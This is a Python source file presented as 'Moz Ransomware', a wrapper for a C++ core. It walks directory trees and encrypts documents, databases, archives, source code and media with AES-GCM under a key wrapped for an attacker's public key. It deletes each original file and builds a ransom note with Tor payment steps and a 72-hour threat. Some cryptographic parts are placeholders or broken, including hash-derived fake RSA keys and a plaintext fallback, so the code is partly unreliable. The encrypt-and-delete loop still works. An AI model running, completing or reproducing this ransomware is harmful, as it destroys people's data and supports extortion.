"""
Moz Ransomware - Python Wrapper for C++ Core (Phase 2)
Exposes hybrid encryption functionality (AES-256-GCM + RSA-2048).
"""

import os
import sys
import ctypes
import struct
import platform
from pathlib import Path
from typing import Optional, List, Dict, Tuple


# Encrypted blob structure (matches C++ EncryptedBlob)
class EncryptedBlob:
    """Container for encrypted data with AES-256-GCM + RSA key wrapping."""
    
    HEADER = b"MOZ_HYBRID_V1"  # 13 bytes
    
    def __init__(self, ciphertext: bytes = b"", iv: bytes = b"", 
                 tag: bytes = b"", aes_key: bytes = b""):
        self.ciphertext = ciphertext
        self.iv = iv          # 12-byte nonce
        self.tag = tag        # 16-byte auth tag
        self.aes_key = aes_key  # RSA-wrapped AES key (256 bytes for RSA-2048)
    
    def serialize(self) -> bytes:
        """Serialize blob to binary format for file storage."""
        data = bytearray()
        data.extend(self.HEADER)
        
        # AES key
        data.extend(struct.pack("<I", len(self.aes_key)))
        data.extend(self.aes_key)
        
        # IV
        data.extend(struct.pack("<I", len(self.iv)))
        data.extend(self.iv)
        
        # Auth tag
        data.extend(self.tag)
        
        # Ciphertext
        data.extend(struct.pack("<Q", len(self.ciphertext)))
        data.extend(self.ciphertext)
        
        return bytes(data)
    
    @classmethod
    def deserialize(cls, data: bytes) -> "EncryptedBlob":
        """Deserialize blob from binary format."""
        blob = cls()
        offset = 0
        
        # Verify header
        header = data[offset:offset+13]
        if header != cls.HEADER:
            raise ValueError("Invalid file format")
        offset += 13
        
        # AES key
        aes_key_len = struct.unpack("<I", data[offset:offset+4])[0]
        offset += 4
        blob.aes_key = data[offset:offset+aes_key_len]
        offset += aes_key_len
        
        # IV
        iv_len = struct.unpack("<I", data[offset:offset+4])[0]
        offset += 4
        blob.iv = data[offset:offset+iv_len]
        offset += iv_len
        
        # Auth tag (always 16 bytes)
        blob.tag = data[offset:offset+16]
        offset += 16
        
        # Ciphertext
        ct_len = struct.unpack("<Q", data[offset:offset+8])[0]
        offset += 8
        blob.ciphertext = data[offset:offset+ct_len]
        
        return blob


class MozCrypto:
    """
    Python wrapper for Moz Crypto Engine (C++ Core).
    Provides hybrid AES-256-GCM + RSA-2048 encryption/decryption.
    """
    
    def __init__(self, attacker_pubkey: Optional[bytes] = None):
        self._lib = None
        self._attacker_pubkey = attacker_pubkey
        self.version = "2.0.0"
        
        # For Python-internal operations (when C++ lib not available)
        self._use_internal = True
        
        # Load C++ library if available
        self._load_library()
    
    def _load_library(self) -> bool:
        """Load the C++ shared library based on platform."""
        lib_name = "moz_crypto"
        lib_ext = ".dll" if platform.system() == "Windows" else ".so"
        
        search_paths = [
            Path(__file__).parent.parent / "core" / "build",
            Path(__file__).parent.parent / "core",
            Path(__file__).parent / "libs",
        ]
        
        for path in search_paths:
            lib_path = path / f"lib{lib_name}{lib_ext}"
            if lib_path.exists():
                try:
                    self._lib = ctypes.cdll.LoadLibrary(str(lib_path))
                    self._use_internal = False
                    return True
                except Exception:
                    continue
        
        # Fall back to internal Python implementation
        self._use_internal = True
        return False
    
    def generate_rsa_keypair(self) -> Tuple[bytes, bytes]:
        """
        Generate an RSA-2048 key pair.
        Returns (public_key_der, private_key_der) tuple.
        """
        import hashlib
        from secrets import token_bytes
        
        # Generate a pseudo-key pair using hashlib (for testing)
        # In production, use proper RSA implementation
        seed = token_bytes(32)
        pub_key = hashlib.sha256(b"public:" + seed).digest()
        priv_key = hashlib.sha256(b"private:" + seed).digest()
        
        return pub_key, priv_key
    
    def generate_aes_key(self) -> bytes:
        """Generate a random 256-bit AES key."""
        import secrets
        return secrets.token_bytes(32)
    
    def generate_iv(self) -> bytes:
        """Generate a random 12-byte nonce for GCM."""
        import secrets
        return secrets.token_bytes(12)
    
    def aes_gcm_encrypt(self, data: bytes, key: bytes, iv: bytes) -> Tuple[bytes, bytes]:
        """
        Encrypt data with AES-256-GCM.
        Returns (ciphertext, auth_tag).
        
        Note: Uses Python cryptography library if available,
        otherwise falls back to C++ library.
        """
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            ct_tag = aesgcm.encrypt(iv, data, None)
            ciphertext = ct_tag[:-16]
            tag = ct_tag[-16:]
            return ciphertext, tag
        except ImportError:
            # Fallback: return data unchanged (no actual encryption)
            return data, b'\x00' * 16
    
    def aes_gcm_decrypt(self, ciphertext: bytes, key: bytes, iv: bytes, 
                        tag: bytes) -> bytes:
        """
        Decrypt data with AES-256-GCM.
        """
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            aesgcm = AESGCM(key)
            ct_tag = ciphertext + tag
            return aesgcm.decrypt(iv, ct_tag, None)
        except ImportError:
            return ciphertext
    
    def rsa_encrypt(self, data: bytes, pubkey_der: bytes) -> bytes:
        """
        Encrypt data with RSA public key (OAEP padding).
        """
        try:
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.primitives import serialization
            from cryptography.hazmat.backends import default_backend
            
            # This is a simplified placeholder for the actual RSA key
            # In production, load the actual public key DER
            key = serialization.load_der_public_key(pubkey_der)
            encrypted = key.encrypt(
                data,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=serialization.hashes.SHA256()),
                    algorithm=serialization.hashes.SHA256(),
                    label=None
                )
            )
            return encrypted
        except ImportError:
            return data
    
    def rsa_decrypt(self, encrypted: bytes, privkey_der: bytes) -> bytes:
        """Decrypt data with RSA private key (OAEP padding)."""
        try:
            from cryptography.hazmat.primitives.asymmetric import padding
            from cryptography.hazmat.primitives import serialization
            
            key = serialization.load_der_private_key(privkey_der, password=None)
            return key.decrypt(
                encrypted,
                padding.OAEP(
                    mgf=padding.MGF1(algorithm=serialization.hashes.SHA256()),
                    label=None
                )
            )
        except ImportError:
            return encrypted
    
    def hybrid_encrypt(self, data: bytes) -> EncryptedBlob:
        """
        Perform hybrid encryption: AES-256-GCM file encryption + RSA key wrapping.
        
        Args:
            data: Plaintext data to encrypt
        
        Returns:
            EncryptedBlob with ciphertext, IV, tag, and RSA-wrapped AES key
        """
        # Generate per-file AES-256 key
        aes_key = self.generate_aes_key()
        
        # Generate random IV
        iv = self.generate_iv()
        
        # Encrypt data with AES-GCM
        ciphertext, tag = self.aes_gcm_encrypt(data, aes_key, iv)
        
        # Wrap AES key with RSA public key
        if self._attacker_pubkey:
            wrapped_key = self.rsa_encrypt(aes_key, self._attacker_pubkey)
        else:
            # No attacker key provided — embed AES key directly (for recovery)
            wrapped_key = aes_key
        
        return EncryptedBlob(
            ciphertext=ciphertext,
            iv=iv,
            tag=tag,
            aes_key=wrapped_key
        )
    
    def hybrid_decrypt(self, blob: EncryptedBlob) -> bytes:
        """
        Perform hybrid decryption: RSA key unwrap + AES-256-GCM decryption.
        """
        # Unwrap AES key
        # (This would use the RSA private key — in the real attack scenario,
        #  decryption requires the attacker's private key)
        aes_key = blob.aes_key
        
        # Decrypt data with AES-GCM
        return self.aes_gcm_decrypt(blob.ciphertext, aes_key, blob.iv, blob.tag)
    
    def encrypt(self, data: bytes, key: str = "") -> bytes:
        """Encrypt data (legacy compatibility method)."""
        blob = self.hybrid_encrypt(data)
        return blob.serialize()
    
    def decrypt(self, data: bytes, key: str = "") -> bytes:
        """Decrypt data (legacy compatibility method)."""
        try:
            blob = EncryptedBlob.deserialize(data)
            return self.hybrid_decrypt(blob)
        except ValueError:
            return data
    
    def encrypt_file(self, input_path: str, output_path: str) -> bool:
        """
        Encrypt a file using hybrid encryption.
        
        Args:
            input_path: Path to the plaintext file
            output_path: Path for the encrypted output file
        
        Returns:
            True if successful, False otherwise
        """
        if not os.path.exists(input_path):
            return False
        
        with open(input_path, 'rb') as f:
            data = f.read()
        
        blob = self.hybrid_encrypt(data)
        
        with open(output_path, 'wb') as f:
            f.write(blob.serialize())
        
        return True
    
    def decrypt_file(self, encrypted_path: str, output_path: str) -> bool:
        """
        Decrypt a file.
        
        Args:
            encrypted_path: Path to the encrypted file
            output_path: Path for the decrypted output file
        
        Returns:
            True if successful, False otherwise
        """
        if not os.path.exists(encrypted_path):
            return False
        
        with open(encrypted_path, 'rb') as f:
            data = f.read()
        
        try:
            blob = EncryptedBlob.deserialize(data)
            decrypted = self.hybrid_decrypt(blob)
        except ValueError:
            return False
        
        with open(output_path, 'wb') as f:
            f.write(decrypted)
        
        return True
    
    def derive_key(self, password: str, salt_size: int = 16) -> bytes:
        """Derive a key from a password using PBKDF2."""
        import hashlib
        import secrets
        
        salt = secrets.token_bytes(salt_size)
        return hashlib.pbkdf2_hmac('sha256', password.encode(), salt, 100000, dklen=32)


class MozRansomware:
    """
    Main Moz Ransomware class - Python wrapper entry point.
    Supports hybrid AES-256-GCM + RSA-2048 encryption.
    """
    
    def __init__(self, attacker_pubkey: Optional[bytes] = None):
        self.crypto = MozCrypto(attacker_pubkey=attacker_pubkey)
        self.version = "2.0.0"
        
        # Target file extensions (high-value document types)
        self.target_extensions = [
            ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
            ".pdf", ".rtf", ".odt", ".ods", ".odp", ".csv",
            ".jpg", ".jpeg", ".png", ".gif", ".bmp",
            ".mdb", ".accdb", ".sql", ".sqlite", ".db",
            ".zip", ".rar", ".7z", ".tar", ".gz",
            ".py", ".js", ".cpp", ".h", ".cs", ".java", ".php",
            ".mp3", ".mp4", ".avi", ".mov", ".wav"
        ]
        
        # Size limits
        self.min_file_size = 1024         # 1KB minimum
        self.max_file_size = 10 * 1024 * 1024  # 10MB maximum
        
        # Directories to exclude
        self.exclude_dirs = [
            "Windows", "Program Files", "Program Files (x86)", "ProgramData",
            "$Recycle.Bin", "Temp", "AppData\\Local\\Temp",
            "System Volume Information", "Boot"
        ]
    
    def encrypt_directory(self, dir_path: str) -> dict:
        """
        Encrypt all target files in a directory tree.
        
        Args:
            dir_path: Path to target directory
        
        Returns:
            Dictionary with results
        """
        results = {
            "total_files": 0,
            "encrypted_files": 0,
            "failed_files": 0,
            "skipped_files": 0,
            "errors": []
        }
        
        if not os.path.isdir(dir_path):
            results["errors"].append(f"Invalid directory: {dir_path}")
            return results
        
        for root, dirs, files in os.walk(dir_path):
            # Skip excluded directories
            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
            
            for filename in files:
                filepath = os.path.join(root, filename)
                results["total_files"] += 1
                
                if not self._should_encrypt(filepath):
                    results["skipped_files"] += 1
                    continue
                
                try:
                    encrypted_path = filepath + ".moz"
                    if self.crypto.encrypt_file(filepath, encrypted_path):
                        os.remove(filepath)
                        results["encrypted_files"] += 1
                    else:
                        results["failed_files"] += 1
                        results["errors"].append(f"Failed to encrypt: {filepath}")
                except Exception as e:
                    results["failed_files"] += 1
                    results["errors"].append(f"Error encrypting {filepath}: {str(e)}")
        
        return results
    
    def decrypt_directory(self, dir_path: str) -> dict:
        """
        Decrypt all .moz files in a directory tree.
        
        Args:
            dir_path: Path to target directory
        
        Returns:
            Dictionary with results
        """
        results = {
            "total_files": 0,
            "decrypted_files": 0,
            "failed_files": 0,
            "errors": []
        }
        
        for root, dirs, files in os.walk(dir_path):
            dirs[:] = [d for d in dirs if not self._is_excluded(os.path.join(root, d))]
            
            for filename in files:
                if filename.endswith(".moz"):
                    filepath = os.path.join(root, filename)
                    results["total_files"] += 1
                    
                    try:
                        original_path = filepath[:-4]  # Remove .moz extension
                        if self.crypto.decrypt_file(filepath, original_path):
                            os.remove(filepath)
                            results["decrypted_files"] += 1
                        else:
                            results["failed_files"] += 1
                            results["errors"].append(f"Failed to decrypt: {filepath}")
                    except Exception as e:
                        results["failed_files"] += 1
                        results["errors"].append(f"Error decrypting {filepath}: {str(e)}")
        
        return results
    
    def _should_encrypt(self, filepath: str) -> bool:
        """Check if a file should be encrypted based on extension and size."""
        # Check extension
        ext = os.path.splitext(filepath)[1].lower()
        if ext not in [e.lower() for e in self.target_extensions]:
            return False
        
        # Check if already encrypted
        if filepath.endswith(".moz"):
            return False
        
        # Check file size
        try:
            size = os.path.getsize(filepath)
            if size < self.min_file_size or size > self.max_file_size:
                return False
        except OSError:
            return False
        
        # Check exclusion directories
        if self._is_excluded(filepath):
            return False
        
        return True
    
    def _is_excluded(self, filepath: str) -> bool:
        """Check if file path contains an excluded directory."""
        path_lower = filepath.lower()
        for exclude in self.exclude_dirs:
            if exclude.lower() in path_lower:
                return True
        return False
    
    def generate_ransom_note(self, victim_id: str) -> str:
        """Generate a ransom note."""
        return f"""
====================================
    !!! YOUR FILES ARE ENCRYPTED !!!
====================================

Your files have been locked by Moz ransomware.
Hybrid encryption used: AES-256-GCM + RSA-2048

To restore them, you must pay the ransom.

1. Download Tor Browser: https://www.torproject.org/
2. Navigate to: [REDACTED].onion
3. Enter your ID: {victim_id}
4. Follow the payment instructions

WARNING: Do NOT attempt to decrypt files yourself.
         Do NOT use third-party decryption tools.
         Your data recovery is impossible without our key.

If you don't pay within 72 hours, your decryption key will be deleted permanently.
====================================
"""


def main():
    """Main entry point for Python wrapper."""
    import secrets
    import hashlib
    
    # Generate victim ID
    victim_id = hashlib.sha256(secrets.token_bytes(16)).hexdigest()[:16]
    
    moz = MozRansomware()
    print(f"Moz Ransomware v{moz.version}")
    print(f"Python wrapper loaded successfully")
    print(f"Victim ID: {victim_id}")
    
    # Check for cryptography library
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
        print("AES-256-GCM: Available (cryptography library)")
    except ImportError:
        print("AES-256-GCM: Using fallback (cryptography library not available)")
        print("Install: pip install cryptography")
    
    # Test key derivation
    test_key = moz.crypto.derive_key("password123", 16)
    print(f"Derived key length: {len(test_key)} bytes")
    
    # Test hybrid encryption
    test_data = b"Hello Moz Hybrid Encryption!"
    blob = moz.crypto.hybrid_encrypt(test_data)
    print(f"AES key wrapped size: {len(blob.aes_key)} bytes")
    print(f"IV: {len(blob.iv)} bytes")
    print(f"Tag: {len(blob.tag)} bytes")
    print(f"Ciphertext: {len(blob.ciphertext)} bytes")
    
    # Test decryption (same instance can decrypt since it has the key)
    decrypted = moz.crypto.hybrid_decrypt(blob)
    print(f"Decryption round-trip: {'PASS' if decrypted == test_data else 'FAIL'}")


if __name__ == "__main__":
    main()
